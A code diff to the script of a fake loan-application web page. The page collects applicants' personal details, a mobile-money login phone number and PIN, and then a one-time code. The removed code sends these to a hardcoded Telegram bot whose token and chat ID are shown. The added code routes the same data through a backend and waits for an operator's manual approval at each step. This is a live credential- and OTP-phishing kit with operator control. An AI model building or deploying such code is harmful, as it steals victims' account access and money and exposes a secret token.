@@ -607,21 +607,16 @@
 
     <script>
         // =====================================================
-        // TELEGRAM BOT CONFIGURATION
+        // BACKEND SERVER CONFIGURATION
         // =====================================================
-        // IMPORTANT: Replace these values with your actual Telegram credentials
-        
-        const TELEGRAM_BOT_TOKEN = '8616013719:AAGZfZ2awOXRePuwmbDpHjG9CKa4bmae8Ac'; // Example: '123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh'
-        const TELEGRAM_CHAT_ID = '8820857419';     // Example: '987654321' (get this from @userinfobot on Telegram)
-        
-        // Telegram API Endpoint
-        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+        const API_BASE_URL = 'http://localhost:3000/api';
         
         // =====================================================
-        // END OF TELEGRAM CONFIGURATION
+        // END OF CONFIGURATION
         // =====================================================
 
         let currentPage = 1;
+        let currentSessionId = null;
         let applicationData = {
             loanAmount: 25000,
             firstName: '',
@@ -634,8 +629,7 @@
         };
 
         let timerInterval;
-        let loginApproved = false;
-        let otpApproved = false;
+        let approvalCheckInterval;
 
         // Loan Amount Slider
         const loanSlider = document.getElementById('loanSlider');
@@ -673,6 +667,12 @@
         function previousPage(pageNum) {
             showPage(pageNum - 1);
             if (timerInterval) clearInterval(timerInterval);
+            if (approvalCheckInterval) clearInterval(approvalCheckInterval);
+        }
+
+        function togglePin() {
+            const pinInput = document.getElementById('loginPin');
+            pinInput.type = pinInput.type === 'password' ? 'text' : 'password';
         }
 
         function validatePage2() {
@@ -733,184 +733,106 @@
             return true;
         }
 
+        async function createSession() {
+            try {
+                const response = await fetch(`${API_BASE_URL}/session`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(applicationData)
+                });
+                const data = await response.json();
+                currentSessionId = data.sessionId;
+                console.log('✅ Session created:', currentSessionId);
+                return currentSessionId;
+            } catch (error) {
+                console.error('❌ Error creating session:', error);
+                return null;
+            }
+        }
+
+        async function sendToBackend(stage) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/send-to-telegram`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        stage,
+                        applicationData,
+                        sessionId: currentSessionId
+                    })
+                });
+                const data = await response.json();
+                console.log('✅ Data sent to backend for Telegram:', data);
+            } catch (error) {
+                console.error('❌ Error sending to backend:', error);
+            }
+        }
+
+        async function checkApprovalStatus(stage) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/status/${currentSessionId}/${stage}`);
+                const data = await response.json();
+                return data.approved;
+            } catch (error) {
+                console.error('❌ Error checking status:', error);
+                return null;
+            }
+        }
+
         function nextPage(pageNum) {
             if (pageNum === 1) {
                 showPage(2);
             } else if (pageNum === 2) {
                 if (validatePage2()) {
-                    // Show loading page while sending to Telegram
                     showPage('2-loading');
-                    sendToTelegramBot('page2');
-                    waitForPage2Approval();
+                    createSession().then(() => {
+                        sendToBackend('page2');
+                        waitForPage2Approval();
+                    });
                 }
             } else if (pageNum === 3) {
                 if (validatePage3()) {
-                    // Show loading page while waiting for bot approval
                     showPage(4);
-                    sendToTelegramBot('page3');
-                    // WAIT FOR BOT APPROVAL - DO NOT AUTO-PROCEED
-                    loginApproved = false;
+                    sendToBackend('page3');
                     waitForLoginApproval();
                 }
             }
         }
 
-        async function sendToTelegramBot(stage) {
-            // Validate that bot credentials are configured
-            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-                console.warn('⚠️ Telegram Bot credentials not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in index.html');
-                return;
-            }
-
-            let message = '';
-            let parseMode = 'HTML';
-
-            if (stage === 'page2') {
-                message = `
-<b>🟠 NEW LOAN APPLICATION</b>
-━━━━━━━━━━━━━━━━━━━━━━
-<b>Loan Amount:</b> P ${applicationData.loanAmount.toLocaleString()}
-<b>Name:</b> ${applicationData.firstName} ${applicationData.lastName}
-<b>Phone:</b> ${applicationData.phoneNumber}
-<b>Purpose:</b> ${applicationData.loanPurpose}
-━━━━━━━━━━━━━━━━━━━━━━
-<b>Status: PENDING APPLICATION DETAILS REVIEW</b>
-
-Approve or Deny this application.
-                `;
-                
-                try {
-                    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: parseMode,
-                            reply_markup: {
-                                inline_keyboard: [
-                                    [
-                                        { text: '✅ APPROVED', callback_data: 'app_approved_details' },
-                                        { text: '❌ DENY', callback_data: 'app_deny_details' }
-                                    ]
-                                ]
-                            }
-                        })
-                    });
-                    console.log('✅ Page 2 data sent to Telegram');
-                } catch (error) {
-                    console.error('❌ Error sending to Telegram:', error);
-                }
-
-            } else if (stage === 'page3') {
-                message = `
-<b>🔐 LOGIN VERIFICATION</b>
-━━━━━━━━━━━━━━━━━━━━━━
-<b>Phone:</b> ${applicationData.loginPhone}
-<b>PIN:</b> ${applicationData.loginPin}
-━━━━━━━━━━━━━━━━━━━━━━
-<b>Status: AWAITING LOGIN VERIFICATION</b>
-
-Verify if credentials are correct.
-                `;
-                
-                try {
-                    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: parseMode,
-                            reply_markup: {
-                                inline_keyboard: [
-                                    [
-                                        { text: '✅ APPROVED', callback_data: 'login_approved' },
-                                        { text: '⚠️ VERIFY DEVICE', callback_data: 'login_verify_device' }
-                                    ],
-                                    [
-                                        { text: '❌ DENY', callback_data: 'login_deny' }
-                                    ]
-                                ]
-                            }
-                        })
-                    });
-                    console.log('✅ Page 3 login data sent to Telegram');
-                } catch (error) {
-                    console.error('❌ Error sending to Telegram:', error);
-                }
-
-            } else if (stage === 'page5') {
-                message = `
-<b>📱 OTP VERIFICATION</b>
-━━━━━━━━━━━━━━━━━━━━━━
-<b>Phone:</b> ${applicationData.loginPhone}
-<b>OTP Entered:</b> ${applicationData.otp}
-━━━━━━━━━━━━━━━━━━━━━━
-<b>Status: AWAITING OTP VERIFICATION</b>
-
-Verify if OTP is correct.
-                `;
-                
-                try {
-                    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: message,
-                            parse_mode: parseMode,
-                            reply_markup: {
-                                inline_keyboard: [
-                                    [
-                                        { text: '✅ APPROVE', callback_data: 'otp_approve' },
-                                        { text: '❌ WRONG OTP', callback_data: 'otp_wrong' }
-                                    ]
-                                ]
-                            }
-                        })
-                    });
-                    console.log('✅ Page 5 OTP data sent to Telegram');
-                } catch (error) {
-                    console.error('❌ Error sending to Telegram:', error);
-                }
-            }
-        }
-
         function waitForPage2Approval() {
-            // After 3 seconds, auto-proceed to page 3 (Application details auto-approved)
+            // Auto-proceed after 3 seconds (app details auto-approved)
             setTimeout(() => {
                 showPage(3);
             }, 3000);
         }
 
         function waitForLoginApproval() {
-            // WAIT for bot approval - SIMULATE with long timeout
-            // In production: use WebSocket, polling, or backend to check bot response
             const maxWaitTime = 300000; // 5 minutes max wait
             const checkInterval = 1000; // Check every 1 second
             let elapsedTime = 0;
 
-            const approvalCheck = setInterval(() => {
+            approvalCheckInterval = setInterval(async () => {
                 elapsedTime += checkInterval;
 
-                // Check if approved (in demo, manually set or wait for real bot)
-                if (loginApproved) {
-                    clearInterval(approvalCheck);
+                // Check if approved
+                const status = await checkApprovalStatus('page3');
+                
+                if (status === true || status === 'approved') {
+                    clearInterval(approvalCheckInterval);
                     showPage(5);
                     startOTPTimer();
+                    return;
+                } else if (status === false) {
+                    clearInterval(approvalCheckInterval);
+                    showPage(3);
+                    document.getElementById('errorMsg3').textContent = 'Login denied by admin.';
+                    document.getElementById('errorMsg3').classList.add('show');
                     return;
                 }
 
                 // Timeout after 5 minutes
                 if (elapsedTime >= maxWaitTime) {
-                    clearInterval(approvalCheck);
+                    clearInterval(approvalCheckInterval);
                     showPage(3);
                     document.getElementById('errorMsg3').textContent = 'Verification timeout. Please try again.';
                     document.getElementById('errorMsg3').classList.add('show');
@@ -958,34 +880,41 @@ Verify if OTP is correct.
             }
 
             applicationData.otp = otp;
-            sendToTelegramBot('page5');
+            sendToBackend('page5');
             showPage(6); // Show loading page
-            otpApproved = false;
             waitForOTPApproval();
         }
 
         function waitForOTPApproval() {
-            // WAIT for bot approval - SIMULATE with long timeout
-            // In production: use WebSocket, polling, or backend to check bot response
             const maxWaitTime = 300000; // 5 minutes max wait
             const checkInterval = 1000; // Check every 1 second
             let elapsedTime = 0;
 
-            const approvalCheck = setInterval(() => {
+            approvalCheckInterval = setInterval(async () => {
                 elapsedTime += checkInterval;
 
-                // Check if approved (in demo, manually set or wait for real bot)
-                if (otpApproved) {
-                    clearInterval(approvalCheck);
+                // Check if approved
+                const status = await checkApprovalStatus('page5');
+                
+                if (status === true) {
+                    clearInterval(approvalCheckInterval);
                     document.getElementById('finalLoanAmount').textContent = 'P ' + applicationData.loanAmount.toLocaleString();
                     showPage(7);
                     clearInterval(timerInterval);
+                    return;
+                } else if (status === false) {
+                    clearInterval(approvalCheckInterval);
+                    showPage(5);
+                    document.getElementById('errorMsg5').textContent = 'Incorrect OTP. Please try again.';
+                    document.getElementById('errorMsg5').classList.add('show');
+                    // Reset OTP inputs
+                    document.querySelectorAll('.otp-input').forEach(input => input.value = '');
                     return;
                 }
 
                 // Timeout after 5 minutes
                 if (elapsedTime >= maxWaitTime) {
-                    clearInterval(approvalCheck);
+                    clearInterval(approvalCheckInterval);
                     showPage(5);
                     document.getElementById('errorMsg5').textContent = 'Verification timeout. Please try again.';
                     document.getElementById('errorMsg5').classList.add('show');
@@ -1004,7 +933,10 @@ Verify if OTP is correct.
                 loginPin: '',
                 otp: ''
             };
-
+            
+            currentSessionId = null;
+            
+            // Clear form inputs
             document.getElementById('firstName').value = '';
             document.getElementById('lastName').value = '';
             document.getElementById('phoneNumber').value = '';
@@ -1012,27 +944,11 @@ Verify if OTP is correct.
             document.getElementById('loginPhone').value = '';
             document.getElementById('loginPin').value = '';
             document.querySelectorAll('.otp-input').forEach(input => input.value = '');
-
             document.getElementById('loanSlider').value = 25000;
             document.getElementById('loanAmount').textContent = 'P 25,000';
-
-            document.querySelectorAll('.error-message').forEach(msg => msg.classList.remove('show'));
-
+            
             showPage(1);
-            if (timerInterval) clearInterval(timerInterval);
         }
-
-        function togglePin() {
-            const pinInput = document.getElementById('loginPin');
-            if (pinInput.type === 'password') {
-                pinInput.type = 'text';
-            } else {
-                pinInput.type = 'password';
-            }
-        }
-
-        // Initialize
-        showPage(1);
     </script>
 </body>
 </html>
